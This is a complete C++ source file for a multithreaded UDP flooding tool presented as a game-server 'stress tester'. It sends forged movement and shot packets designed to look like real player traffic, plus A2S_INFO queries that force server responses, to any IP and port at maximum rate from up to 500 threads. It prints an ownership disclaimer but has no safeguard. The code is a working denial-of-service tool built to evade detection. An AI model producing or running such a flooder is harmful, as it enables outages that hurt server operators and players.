#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <cstring>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <vector>
#include <atomic>
#include <random>
#include <netdb.h>
#include <signal.h>
#include <iomanip>

class GameServerStresser {
private:
    std::string target_ip;
    int target_port;
    int duration;
    int thread_count;
    std::atomic<bool> running;
    std::atomic<long long> total_packets;
    std::atomic<long long> total_bytes;
    std::chrono::steady_clock::time_point start_time;
    
public:
    GameServerStresser(std::string ip, int port, int dur, int threads) 
        : target_ip(ip), target_port(port), duration(dur), thread_count(threads), running(true), total_packets(0), total_bytes(0) {}
    
    // Create game-specific packets that LOOK like real player traffic
    std::vector<uint8_t> create_movement_packet(int sequence) {
        std::vector<uint8_t> packet;
        
        // Common game packet structure (simulated)
        uint8_t header[] = {
            0xAA, 0xBB,  // Packet identifier
            (uint8_t)(sequence & 0xFF),  // Sequence number low
            (uint8_t)((sequence >> 8) & 0xFF),  // Sequence high
            0x01,  // Packet type: movement
        };
        
        // Random movement data (looks like player position)
        uint8_t move_data[] = {
            (uint8_t)(rand() % 360),  // Angle X
            (uint8_t)(rand() % 360),  // Angle Y
            (uint8_t)(rand() % 100),  // Velocity
            0x00, 0x00, 0x00, 0x00   // Position delta
        };
        
        packet.insert(packet.end(), header, header + sizeof(header));
        packet.insert(packet.end(), move_data, move_data + sizeof(move_data));
        
        // Add random padding to match real packet sizes
        int padding = rand() % 32;
        for (int i = 0; i < padding; i++) {
            packet.push_back(rand() % 256);
        }
        
        return packet;
    }
    
    std::vector<uint8_t> create_shot_packet(int sequence) {
        std::vector<uint8_t> packet;
        
        uint8_t header[] = {
            0xAA, 0xBB,  // Packet identifier
            (uint8_t)(sequence & 0xFF),
            (uint8_t)((sequence >> 8) & 0xFF),
            0x02,  // Packet type: shot
        };
        
        uint8_t shot_data[] = {
            (uint8_t)(rand() % 360),  // Aim X
            (uint8_t)(rand() % 360),  // Aim Y
            (uint8_t)(rand() % 100),  // Weapon ID
            0x01, 0x00,  // Shot confirmed
        };
        
        packet.insert(packet.end(), header, header + sizeof(header));
        packet.insert(packet.end(), shot_data, shot_data + sizeof(shot_data));
        
        return packet;
    }
    
    // Create query packets that force server responses
    std::vector<uint8_t> create_status_query() {
        // A2S_INFO - forces server to respond with full info
        std::vector<uint8_t> query = {
            0xFF, 0xFF, 0xFF, 0xFF,  // Connectionless
            0x54, 0x53, 0x6F, 0x75, 0x72, 0x63, 0x65,  // "TSource"
            0x20, 0x45, 0x6E, 0x67, 0x69, 0x6E, 0x65,  // " Engine"
            0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00   // " Query\0"
        };
        return query;
    }
    
    void attack_thread() {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return;
        
        // Allow broadcast
        int broadcast = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
        
        // Increase buffer size for high traffic
        int buffer_size = 2 * 1024 * 1024;  // 2MB
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &buffer_size, sizeof(buffer_size));
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip.c_str(), &server_addr.sin_addr);
        
        // Prepare multiple packet types
        auto queries = create_status_query();
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> packet_type(0, 2);
        
        int seq = 0;
        int thread_packets = 0;
        int thread_bytes = 0;
        auto thread_start = std::chrono::steady_clock::now();
        
        // Buffer for server responses
        char response[4096];
        
        while (running) {
            std::vector<uint8_t> packet;
            int type = packet_type(gen);
            
            switch(type) {
                case 0:
                    packet = create_movement_packet(seq++);
                    break;
                case 1:
                    packet = create_shot_packet(seq++);
                    break;
                default:
                    packet = queries;
                    break;
            }
            
            // Send packet
            int sent = sendto(sock, packet.data(), packet.size(), 0, 
                             (struct sockaddr*)&server_addr, sizeof(server_addr));
            
            if (sent > 0) {
                thread_packets++;
                thread_bytes += sent;
                total_packets++;
                total_bytes += sent;
                
                // Try to read response (if server replies)
                struct sockaddr_in from;
                socklen_t from_len = sizeof(from);
                int received = recvfrom(sock, response, sizeof(response), MSG_DONTWAIT,
                                       (struct sockaddr*)&from, &from_len);
                if (received > 0) {
                    // Server responded - it's processing our packets!
                    total_bytes += received;
                }
            }
            
            // Check duration
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - thread_start).count();
            if (elapsed >= duration) break;
            
            // Minimal delay for max packet rate
            if (thread_packets % 100 == 0) {
                std::this_thread::sleep_for(std::chrono::microseconds(10));
            }
        }
        
        close(sock);
    }
    
    void stats_thread() {
        long long last_packets = 0;
        long long last_bytes = 0;
        
        while (running) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
            
            long long current_packets = total_packets.load();
            long long current_bytes = total_bytes.load();
            
            long long pps = (current_packets - last_packets) / 5;
            long long bps = (current_bytes - last_bytes) * 8 / 5;  // bits per second
            
            std::cout << "\r[" << elapsed << "s] Packets: " << current_packets 
                      << " | PPS: " << pps
                      << " | Bandwidth: " << (bps / 1000 / 1000) << " Mbps" << std::flush;
            
            last_packets = current_packets;
            last_bytes = current_bytes;
        }
        std::cout << std::endl;
    }
    
    void start() {
        std::cout << "\n==================================================" << std::endl;
        std::cout << "     GAME SERVER STRESS TESTER" << std::endl;
        std::cout << "     FOR YOUR OWN SERVER ONLY" << std::endl;
        std::cout << "==================================================" << std::endl;
        std::cout << "\n📍 Target: " << target_ip << ":" << target_port << std::endl;
        std::cout << "⏱️  Duration: " << duration << " seconds" << std::endl;
        std::cout << "🧵 Threads: " << thread_count << std::endl;
        std::cout << "📦 Packet Type: Mixed (Movement + Queries)" << std::endl;
        std::cout << "\n🔥 Starting stress test...\n" << std::endl;
        
        start_time = std::chrono::steady_clock::now();
        
        // Start stats thread
        std::thread stats(&GameServerStresser::stats_thread, this);
        
        // Start attack threads
        std::vector<std::thread> threads;
        for (int i = 0; i < thread_count; i++) {
            threads.emplace_back(&GameServerStresser::attack_thread, this);
        }
        
        // Wait for duration
        for (auto& t : threads) {
            t.join();
        }
        
        running = false;
        stats.join();
        
        std::cout << "\n\n✅ Test completed!" << std::endl;
        std::cout << "📊 Total packets sent: " << total_packets.load() << std::endl;
        std::cout << "📊 Total data sent: " << (total_bytes.load() / 1024 / 1024) << " MB" << std::endl;
        std::cout << "==================================================\n" << std::endl;
    }
};

void signal_handler(int signum) {
    std::cout << "\n\n⚠️ Interrupted by user" << std::endl;
    exit(0);
}

int main(int argc, char* argv[]) {
    signal(SIGINT, signal_handler);
    
    std::cout << "\n⚠️  WARNING: ONLY use on servers YOU OWN!" << std::endl;
    std::cout << "⚠️  Unauthorized use is ILLEGAL!\n" << std::endl;
    
    if (argc < 5) {
        std::cout << "Usage: " << argv[0] << " <ip> <port> <duration> <threads>\n\n";
        std::cout << "Examples:\n";
        std::cout << "  " << argv[0] << " 127.0.0.1 7777 60 100\n";
        std::cout << "  " << argv[0] << " 192.168.1.100 27015 30 500\n";
        std::cout << "\n💡 For YOUR game server:\n";
        std::cout << "  " << argv[0] << " YOUR_SERVER_IP YOUR_UDP_PORT 60 500\n";
        return 1;
    }
    
    std::string ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int threads = std::stoi(argv[4]);
    
    // Limit threads for performance
    if (threads > 500) {
        threads = 500;
        std::cout << "⚠️ Reducing threads to 500 for stability\n";
    }
    
    GameServerStresser stresser(ip, port, duration, threads);
    stresser.start();
    
    return 0;
}